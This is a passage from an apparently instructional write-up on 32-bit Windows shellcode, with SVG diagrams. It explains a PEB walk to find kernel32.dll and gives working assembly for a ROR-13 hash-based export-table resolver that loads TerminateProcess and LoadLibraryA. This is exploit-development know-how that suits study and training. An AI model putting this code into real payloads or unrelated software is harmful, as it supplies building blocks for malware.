    <filter id="glow_s101"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s101" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s101)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s101)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s101)" font-weight="bold">Unicode String Layout: "kernel32.dll"</text>
  <text x="40" y="55" fill="#8b949e" font-size="10">Byte offset:</text>
  <!-- Byte offset numbers -->
  <text x="105" y="55" fill="#8b949e" font-size="9" text-anchor="middle">0</text>
  <text x="131" y="55" fill="#8b949e" font-size="9" text-anchor="middle">2</text>
  <text x="157" y="55" fill="#8b949e" font-size="9" text-anchor="middle">4</text>
  <text x="183" y="55" fill="#8b949e" font-size="9" text-anchor="middle">6</text>
  <text x="209" y="55" fill="#8b949e" font-size="9" text-anchor="middle">8</text>
  <text x="235" y="55" fill="#8b949e" font-size="9" text-anchor="middle">10</text>
  <text x="261" y="55" fill="#8b949e" font-size="9" text-anchor="middle">12</text>
  <text x="287" y="55" fill="#8b949e" font-size="9" text-anchor="middle">14</text>
  <text x="313" y="55" fill="#8b949e" font-size="9" text-anchor="middle">16</text>
  <text x="339" y="55" fill="#8b949e" font-size="9" text-anchor="middle">18</text>
  <text x="365" y="55" fill="#8b949e" font-size="9" text-anchor="middle">20</text>
  <text x="391" y="55" fill="#8b949e" font-size="9" text-anchor="middle">22</text>
  <text x="417" y="55" fill="#ff3366" font-size="9" text-anchor="middle" font-weight="bold">24</text>
  <!-- Character cells -->
  <rect x="92" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="105" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">k</text>
  <rect x="118" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="131" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">e</text>
  <rect x="144" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="157" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">r</text>
  <rect x="170" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="183" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">n</text>
  <rect x="196" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="209" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">e</text>
  <rect x="222" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="235" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
  <rect x="248" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="261" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">3</text>
  <rect x="274" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="287" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">2</text>
  <rect x="300" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="313" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">.</text>
  <rect x="326" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="339" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">d</text>
  <rect x="352" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="365" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
  <rect x="378" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="391" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
  <rect x="404" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="417" y="82" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">\0</text>
  <!-- Index labels -->
  <text x="40" y="82" fill="#8b949e" font-size="10">Char index:</text>
  <text x="105" y="108" fill="#8b949e" font-size="8" text-anchor="middle">0</text>
  <text x="131" y="108" fill="#8b949e" font-size="8" text-anchor="middle">1</text>
  <text x="157" y="108" fill="#8b949e" font-size="8" text-anchor="middle">2</text>
  <text x="183" y="108" fill="#8b949e" font-size="8" text-anchor="middle">3</text>
  <text x="209" y="108" fill="#8b949e" font-size="8" text-anchor="middle">4</text>
  <text x="235" y="108" fill="#8b949e" font-size="8" text-anchor="middle">5</text>
  <text x="261" y="108" fill="#8b949e" font-size="8" text-anchor="middle">6</text>
  <text x="287" y="108" fill="#8b949e" font-size="8" text-anchor="middle">7</text>
  <text x="313" y="108" fill="#8b949e" font-size="8" text-anchor="middle">8</text>
  <text x="339" y="108" fill="#8b949e" font-size="8" text-anchor="middle">9</text>
  <text x="365" y="108" fill="#8b949e" font-size="8" text-anchor="middle">10</text>
  <text x="391" y="108" fill="#8b949e" font-size="8" text-anchor="middle">11</text>
  <text x="417" y="108" fill="#ff3366" font-size="8" text-anchor="middle" font-weight="bold">12</text>
  <!-- Annotation -->
  <rect x="440" y="62" width="290" height="50" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="585" y="82" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">cmp [edi + 12*2], cx</text>
  <text x="585" y="100" text-anchor="middle" fill="#e0e7ff" font-size="10">byte 24 = char index 12 = \0</text>
  <!-- Bottom comparison -->
  <rect x="92" y="125" width="640" height="55" rx="5" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="130" y="148" fill="#ff6b35" font-size="11">"ntdll.dll"</text>
  <text x="270" y="148" fill="#8b949e" font-size="10">= 9 chars, index 12 is past the string</text>
  <text x="490" y="148" fill="#ff3366" font-size="11">NOT zero at [12*2]</text>
  <text x="130" y="168" fill="#ff6b35" font-size="11">"kernelbase.dll"</text>
  <text x="290" y="168" fill="#8b949e" font-size="10">= 14 chars, index 12 = 'l'</text>
  <text x="490" y="168" fill="#ff3366" font-size="11">NOT zero at [12*2]</text>
</svg></div>

**`jne next_module`** -- If the comparison fails, this is not our module. Loop to the next one.

When the loop exits, **EBX holds the base address of kernel32.dll**. This is the crucial value that the rest of our shellcode depends on.

### Visualizing the PEB Walk

<div align="center"><svg viewBox="0 0 750 420" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s203" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s203"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s203" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arrow1" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#00ff88"/>
    </marker>
    <marker id="arrow2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#00d4ff"/>
    </marker>
      <linearGradient id="bg_s202" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s202"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s202" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="420" rx="10" fill="url(#bg_s202)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s202)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s203)" font-weight="bold">PEB Walk: Finding kernel32.dll Base Address</text>
  <rect x="20" y="55" width="120" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="80" y="78" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">TEB</text>
  <text x="80" y="100" text-anchor="middle" fill="#e0e7ff" font-size="11">fs:[0x30]</text>
  <text x="80" y="116" text-anchor="middle" fill="#8b949e" font-size="10">--> PEB ptr</text>
  <line x1="140" y1="90" x2="190" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="195" y="55" width="130" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="260" y="78" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">PEB</text>
  <text x="260" y="100" text-anchor="middle" fill="#e0e7ff" font-size="11">[PEB+0x0C]</text>
  <text x="260" y="116" text-anchor="middle" fill="#8b949e" font-size="10">--> Ldr ptr</text>
  <line x1="325" y1="90" x2="380" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="385" y="45" width="175" height="85" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="472" y="68" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">PEB_LDR_DATA</text>
  <text x="472" y="88" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x0C] InLoadOrder</text>
  <text x="472" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x14] InMemoryOrder</text>
  <text x="472" y="118" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">[+0x1C] InInitOrder</text>
  <line x1="560" y1="118" x2="560" y2="165" stroke="#00ff88" stroke-width="2" marker-end="url(#arrow1)"/>
  <rect x="30" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="130" y="198" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">ntdll.dll</text>
  <text x="130" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x08] BaseAddr = 0x7C9...</text>
  <text x="130" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "ntdll.dll"</text>
  <text x="130" y="255" text-anchor="middle" fill="#8b949e" font-size="10">name[12*2] != 0 --> skip</text>
  <rect x="275" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="198" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">kernelbase.dll</text>
  <text x="375" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x08] BaseAddr = 0x75E...</text>
  <text x="375" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "KERNELBASE..."</text>
  <text x="375" y="255" text-anchor="middle" fill="#8b949e" font-size="10">name[12*2] != 0 --> skip</text>
  <rect x="520" y="175" width="200" height="90" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="620" y="198" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">kernel32.dll</text>
  <text x="620" y="218" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">[+0x08] BaseAddr --> EBX</text>
  <text x="620" y="235" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] Name = "kernel32.dll"</text>
  <text x="620" y="255" text-anchor="middle" fill="#00ff88" font-size="10">name[12*2] == 0 --> MATCH!</text>
  <line x1="230" y1="220" x2="275" y2="220" stroke="#00d4ff" stroke-width="2" marker-end="url(#arrow2)"/>
  <text x="252" y="212" text-anchor="middle" fill="#00d4ff" font-size="9">flink</text>
  <line x1="475" y1="220" x2="520" y2="220" stroke="#00d4ff" stroke-width="2" marker-end="url(#arrow2)"/>
  <text x="497" y="212" text-anchor="middle" fill="#00d4ff" font-size="9">flink</text>
  <line x1="560" y1="165" x2="130" y2="175" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrow1)"/>
  <rect x="80" y="300" width="590" height="100" rx="6" fill="#0d1117" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="375" y="322" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Module Identification: Why cmp [edi+12*2], cx Works</text>
  <text x="375" y="345" text-anchor="middle" fill="#e0e7ff" font-size="11">"kernel32.dll" = 12 chars. In UTF-16LE, char index 12 = byte offset 24.</text>
  <text x="375" y="365" text-anchor="middle" fill="#e0e7ff" font-size="11">The 13th character of "kernel32.dll" is the null terminator (0x0000).</text>
  <text x="375" y="385" text-anchor="middle" fill="#00ff88" font-size="11">"ntdll.dll" has 9 chars, "kernelbase.dll" has 14 --> neither matches.</text>
</svg></div>

*Figure 3.1 - The PEB walk follows a chain of pointers from the TEB segment register through the PEB and loader data to a linked list of loaded modules. We identify kernel32.dll by checking that its 13th Unicode character is the null terminator -- a property unique to a 12-character module name.*

---

## 4. The find_function Engine: Resolving API Addresses

We now have kernel32.dll's base address in EBX. But a base address alone does not let us call functions. We need the exact virtual address of functions like `LoadLibraryA` and `CreateProcessA`. To get those, we must parse the **PE Export Table** -- the part of a DLL that says "here are the functions I export, and here is where each one lives in memory."

But first, we need to solve a bootstrapping problem: how does our shellcode reference its own internal function (`find_function`) when it does not know its own address?

### JMP/CALL/POP: Getting Our Own Address

This is one of the most elegant tricks in shellcode writing. The x86 `CALL` instruction does two things: it pushes the address of the *next* instruction onto the stack, then jumps to the target. We can exploit this to capture an address.

```nasm
find_function_shorten:
    jmp   find_function_shorten_bnc    ; (1) Jump forward

find_function_ret:
    pop   esi                          ; (3) ESI = address of find_function
    mov   [ebp+0x04], esi              ; (4) Save it in our variable table
    jmp   resolve_symbols_kernel32     ; (5) Continue to symbol resolution

find_function_shorten_bnc:
    call  find_function_ret            ; (2) CALL backward -- pushes addr of find_function

find_function:                         ; <-- this is the address CALL pushed
    pushad
    ; ... (the actual function body)
```

Here is the control flow step by step:

1. **JMP forward** over the `find_function_ret` block to `find_function_shorten_bnc`.
2. **CALL backward** to `find_function_ret`. The CALL instruction pushes the address of the *next* instruction -- which is `find_function` itself -- onto the stack.
3. **POP ESI** grabs that address off the stack. Now ESI holds the exact runtime address of `find_function`.
4. **Save it** at `[ebp+0x04]` so we can call it later with `call dword ptr [ebp+0x04]`.
5. **JMP** to the main code flow to start resolving symbols.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s204" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s204"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s204" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arrowG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#00ff88"/>
    </marker>
    <marker id="arrowO" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0,0 8,3 0,6" fill="#ff6b35"/>
    </marker>
      <linearGradient id="bg_s203" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s203"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s203" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="340" rx="10" fill="url(#bg_s203)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s203)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s204)" font-weight="bold">JMP / CALL / POP Control Flow</text>
  <rect x="30" y="55" width="240" height="42" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="40" y="73" fill="#8b949e" font-size="10">find_function_shorten:</text>
  <text x="50" y="89" fill="#e0e7ff" font-size="12">jmp find_function_shorten_bnc</text>
  <rect x="30" y="110" width="240" height="72" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="40" y="128" fill="#8b949e" font-size="10">find_function_ret:</text>
  <text x="50" y="146" fill="#e0e7ff" font-size="12">pop esi</text>
  <text x="50" y="162" fill="#e0e7ff" font-size="12">mov [ebp+0x04], esi</text>
  <text x="50" y="178" fill="#e0e7ff" font-size="12">jmp resolve_symbols...</text>
  <rect x="30" y="195" width="240" height="42" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="40" y="213" fill="#8b949e" font-size="10">find_function_shorten_bnc:</text>
  <text x="50" y="229" fill="#ff6b35" font-size="12" font-weight="bold">call find_function_ret</text>
  <rect x="30" y="250" width="240" height="42" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="40" y="268" fill="#8b949e" font-size="10">find_function:</text>
  <text x="50" y="284" fill="#ff3366" font-size="12" font-weight="bold">pushad ; ... (body)</text>
  <path d="M 270,76 C 330,76 330,216 270,216" fill="none" stroke="#00ff88" stroke-width="2" marker-end="url(#arrowG)"/>
  <rect x="300" y="130" width="60" height="24" rx="5" fill="#0d1117"/>
  <text x="330" y="147" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">(1) JMP</text>
  <path d="M 270,216 C 380,216 380,145 270,145" fill="none" stroke="#ff6b35" stroke-width="2" marker-end="url(#arrowO)"/>
  <rect x="350" y="165" width="78" height="24" rx="5" fill="#0d1117"/>
  <text x="389" y="182" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">(2) CALL</text>
  <rect x="490" y="195" width="235" height="95" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="607" y="215" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">CALL pushes onto stack:</text>
  <text x="607" y="240" text-anchor="middle" fill="#e0e7ff" font-size="12">address of next instruction</text>
  <text x="607" y="260" text-anchor="middle" fill="#e0e7ff" font-size="12">= address of find_function</text>
  <text x="607" y="280" text-anchor="middle" fill="#00ff88" font-size="11">(3) POP ESI retrieves it!</text>
  <line x1="430" y1="216" x2="490" y2="240" stroke="#ff6b35" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrowO)"/>
  <rect x="490" y="55" width="235" height="65" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="607" y="78" text-anchor="middle" fill="#00ff88" font-size="12">(4) Save at [ebp+0x04]</text>
  <text x="607" y="100" text-anchor="middle" fill="#00ff88" font-size="12">(5) JMP to main code flow</text>
</svg></div>

*Figure 4.1 - The JMP/CALL/POP trick exploits the fact that CALL pushes the next instruction's address onto the stack. By placing CALL just before find_function, we capture find_function's runtime address via POP, without needing any hardcoded addresses.*

### Parsing the PE Export Table

Now let's look at the `find_function` body itself. When we call it, EBX contains the base address of the target DLL, and a 4-byte hash of the desired function name has been pushed onto the stack.

The PE Export Table has a structure called `IMAGE_EXPORT_DIRECTORY` that contains three parallel arrays:

- **AddressOfNames** -- an array of RVAs pointing to the ASCII name of each exported function
- **AddressOfNameOrdinals** -- an array of 16-bit ordinals, one per name, that index into...
- **AddressOfFunctions** -- an array of RVAs pointing to the actual function code

Here is the complete `find_function` code:

```nasm
find_function:
    pushad                          ; Save all 8 registers (32 bytes on stack)
    mov   eax, [ebx+0x3c]          ; EAX = offset to PE signature
    mov   edi, [ebx+eax+0x78]      ; EDI = Export Table RVA (PE+0x78)
    add   edi, ebx                  ; EDI = Export Table VA (RVA + base)
    mov   ecx, [edi+0x18]          ; ECX = NumberOfNames (our loop counter)
    mov   eax, [edi+0x20]          ; EAX = AddressOfNames RVA
    add   eax, ebx                  ; EAX = AddressOfNames VA
    mov   [ebp-4], eax              ; Save AddressOfNames VA for the loop

find_function_loop:
    jecxz find_function_finished    ; If ECX == 0, we exhausted all names
    dec   ecx                       ; Decrement counter (we iterate backward)
    mov   eax, [ebp-4]              ; Restore AddressOfNames VA
    mov   esi, [eax+ecx*4]          ; ESI = RVA of the current function name
    add   esi, ebx                  ; ESI = VA of the current function name

compute_hash:
    xor   eax, eax                  ; EAX = 0
    cdq                             ; EDX = 0 (sign-extend EAX into EDX)
    cld                             ; Clear direction flag (LODSB goes forward)

compute_hash_again:
    lodsb                           ; AL = next byte from [ESI], ESI++
    test  al, al                    ; Is it the null terminator?
    jz    compute_hash_finished     ; Yes -- hash is complete
    ror   edx, 0x0d                 ; Rotate EDX right by 13 bits
    add   edx, eax                  ; Add current character to hash
    jmp   compute_hash_again        ; Next character

compute_hash_finished:
find_function_compare:
    cmp   edx, [esp+0x24]          ; Compare hash with the requested hash
    jnz   find_function_loop        ; No match -- try next name
    mov   edx, [edi+0x24]          ; EDX = AddressOfNameOrdinals RVA
    add   edx, ebx                  ; EDX = AddressOfNameOrdinals VA
    mov   cx, [edx+2*ecx]          ; CX = ordinal for this name (16-bit)
    mov   edx, [edi+0x1c]          ; EDX = AddressOfFunctions RVA
    add   edx, ebx                  ; EDX = AddressOfFunctions VA
    mov   eax, [edx+4*ecx]         ; EAX = function RVA (indexed by ordinal)
    add   eax, ebx                  ; EAX = function VA (final address!)
    mov   [esp+0x1c], eax          ; Overwrite saved EAX in pushad frame

find_function_finished:
    popad                           ; Restore all registers (EAX = resolved address)
    ret                             ;
```

**The ROR-13 Hash:** Instead of comparing full function name strings, we use a compact hash. The algorithm rotates the accumulator right by 13 bits before adding each character. The result is a 32-bit hash that is (for practical purposes) unique per function name. For example:
- `TerminateProcess` hashes to `0x78b5b983`
- `LoadLibraryA` hashes to `0xec0e4e8e`
- `CreateProcessA` hashes to `0x16b3fe72`

**The `[esp+0x24]` magic:** The caller does `push hash; call [ebp+0x04]`. The `call` pushes a 4-byte return address. Then `pushad` saves 8 registers (32 = `0x20` bytes). So the hash is at `ESP + 0x20 + 0x04 = ESP + 0x24`.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s102" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s102"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s102" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="340" rx="10" fill="url(#bg_s102)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s102)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s102)" font-weight="bold">The pushad Frame: Why [esp+0x24] Reaches the Hash</text>
  <!-- Stack visualization -->
  <text x="60" y="55" fill="#8b949e" font-size="10">HIGH ADDR</text>
  <!-- Hash argument -->
  <rect x="200" y="60" width="280" height="32" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="81" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Hash argument (0xec0e4e8e)</text>
  <text x="530" y="81" fill="#ff3366" font-size="11">ESP+0x24</text>
  <!-- Return address -->
  <rect x="200" y="95" width="280" height="32" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="340" y="116" text-anchor="middle" fill="#ff6b35" font-size="12">Return address (from CALL)</text>
  <text x="530" y="116" fill="#8b949e" font-size="10">+0x04</text>
  <!-- pushad frame -->
  <rect x="200" y="132" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="340" y="151" text-anchor="middle" fill="#e0e7ff" font-size="11">saved EDI</text>
  <text x="530" y="151" fill="#8b949e" font-size="10">+0x20</text>
  <rect x="200" y="162" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="340" y="181" text-anchor="middle" fill="#e0e7ff" font-size="11">saved ESI</text>
  <rect x="200" y="192" width="280" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="340" y="211" text-anchor="middle" fill="#e0e7ff" font-size="11">saved EBP, ESP, EBX, EDX, ECX</text>
  <rect x="200" y="222" width="280" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="340" y="241" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">saved EAX  [esp+0x1C] overwrite!</text>
  <text x="530" y="241" fill="#00ff88" font-size="10">+0x00</text>
  <!-- ESP pointer -->
  <rect x="200" y="255" width="280" height="28" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="274" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">ESP (after pushad)</text>
  <!-- Annotations -->
  <text x="60" y="285" fill="#8b949e" font-size="10">LOW ADDR</text>
  <!-- Brace for pushad -->
  <line x1="175" y1="135" x2="175" y2="250" stroke="#00d4ff" stroke-width="2"/>
  <line x1="175" y1="135" x2="185" y2="135" stroke="#00d4ff" stroke-width="2"/>
  <line x1="175" y1="250" x2="185" y2="250" stroke="#00d4ff" stroke-width="2"/>
  <text x="100" y="195" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">pushad</text>
  <text x="100" y="210" text-anchor="middle" fill="#00d4ff" font-size="10">0x20 bytes</text>
  <!-- Result box -->
  <rect x="140" y="295" width="470" height="30" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="315" text-anchor="middle" fill="#00ff88" font-size="11">After popad: EAX = resolved function address (written at [esp+0x1C])</text>
</svg></div>

**The pushad frame trick:** Writing to `[esp+0x1c]` overwrites the saved EAX in the pushad frame. When `popad` restores all registers, EAX magically contains our resolved function address.

### Using find_function

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983                ; Hash of "TerminateProcess"
    call  dword ptr [ebp+0x04]     ; Call find_function
    mov   [ebp+0x10], eax          ; Save resolved address

    push  0xec0e4e8e                ; Hash of "LoadLibraryA"
    call  dword ptr [ebp+0x04]     ; Call find_function
    mov   [ebp+0x14], eax          ; Save resolved address
```

Push the hash, call the engine, store the result. Three lines per API.

<div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s205" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s205"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s205" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arwB" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00d4ff"/></marker>
    <marker id="arwG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
    <marker id="arwR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#ff3366"/></marker>
      <linearGradient id="bg_s204" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s204"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s204" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="440" rx="10" fill="url(#bg_s204)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s204)"/>
